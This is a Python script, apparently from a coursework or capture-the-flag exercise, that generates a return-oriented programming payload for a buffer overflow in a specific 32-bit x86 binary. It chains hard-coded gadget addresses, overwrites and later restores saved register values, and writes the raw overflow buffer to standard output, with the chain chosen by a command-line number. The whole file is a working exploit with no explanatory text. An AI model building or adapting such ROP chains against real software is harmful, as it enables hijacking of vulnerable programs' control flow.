#!/usr/bin/env python3

import struct, sys

def int_to_bytes_le(value):
	return struct.pack('<i', value)


"""Addresses of all the gadgets"""
gad_1 = b"\xf3\x15\x09\x08"
gad_3 = b"\x1e\x90\x04\x08" 
gad_4 = b"\x9a\xf4\x0c\x08" 
gad_8 = b"\x9f\x9a\x04\x08" 
gad_9 = b"\xb2\x1d\x05\x08" 
gad_10 = b"\xd6\x6a\x06\x08"
gad_11 = b"\xba\xd1\x04\x08"
gad_12 = b"\x80\x64\x06\x08"
gad_13 = b"\xcd\x86\x07\x08"
gad_14 = b"\x3c\xb6\x08\x08"
gad_15 = b"\xd4\xdc\x07\x08"
gad_16 = b"\x6b\xdc\x07\x08"
gad_17 = b"\x47\xed\x06\x08"
gad_18 = b"\x98\x4b\x0b\x08"
gad_19 = b"\x7c\x61\x06\x08"
gad_20 = b"\xd4\xdc\x07\x08"
gad_21 = b"\x00\xdc\x06\x08"
gad_22 = b"\x1e\x90\x04\x08"
gad_23 = b"\x2d\xf4\x0c\x08"
gad_24 = b"\x27\x14\x06\x08"
gad_25 = b"\x68\xd9\x06\x08"
gad_26 = b"\x70\x47\x0c\x08"
gad_27 = b"\xc4\x97\x04\x08"
gad_28 = b"\x90\x4e\x06\x08"
gad_29 = b"\xa6\x57\x06\x08"
orig_code = b"\x8b\x98\x04\x08"




"""Hex values of different dec values needed to pass to different registers"""
"""hex of val 1"""
val_1 = b"\x01\x00\x00\x00"

"""hex of val 5"""
val_5 = b"\x05\x00\x00\x00"

"""hex of val 2"""
val_2 = b"\x02\x00\x00\x00"


"""Values of Registers before the overflow for the restoration purpose"""
ebp_val = b"\x58\xcf\xff\xff"
ecx_val = b"\x7c\xca\x10\x08"
ebx_val = b"\xf4\xaf\x10\x08"
res_add = b"\xe4\xcf\xff\xff"


stack_add = b"\x5c\xd0\xff\xff"
exit_put = b"\xec\xcf\xff\xff"
final_ret_add = b"\x60\x0c\x05\x08"
counter_add = b"\xdc\xcf\xff\xff"
first_inst = b"\xfc\xcf\xff\xff"
jmp_inst = b"\xf4\xcf\xff\xff"
sec_inst = b"\x40\xcf\xff\xff"
last_add = b"\x18\xd0\xff\xff"


n = int(sys.argv[1])
hex_n = int_to_bytes_le(n)
final_input = ""

if(n==1 or n==0):
	final_input = b'A'*36 +ebp_val+gad_4+val_1+gad_1+ecx_val+gad_3+ebx_val+orig_code

elif(n==2):
	final_input = b'A'*36 +ebp_val+gad_4+val_2+gad_1+ecx_val+gad_3+ebx_val+orig_code
else:
	final_input = b'A'*24+val_2+val_2+val_1 +ebp_val +gad_1 +res_add+gad_8+val_1+gad_9+gad_27+exit_put+gad_4+final_ret_add+gad_28+b'A'*8+ebp_val+gad_10+ebx_val+ebx_val+val_1+ebp_val+gad_11+ebx_val+ebx_val+val_1+ebp_val+gad_1+ecx_val+gad_12+gad_1 +res_add+gad_13+gad_4+res_add+gad_15+gad_4+counter_add+gad_16+gad_17+gad_3+hex_n+gad_18+counter_add+gad_19+gad_4+counter_add+gad_20+gad_25+gad_13+b'A'*8+gad_4+orig_code+gad_3+ebx_val+gad_21+gad_27+stack_add+gad_28+b'A'*8+ebp_val+gad_4+sec_inst+gad_29+jmp_inst

sys.stdout.buffer.write(final_input)

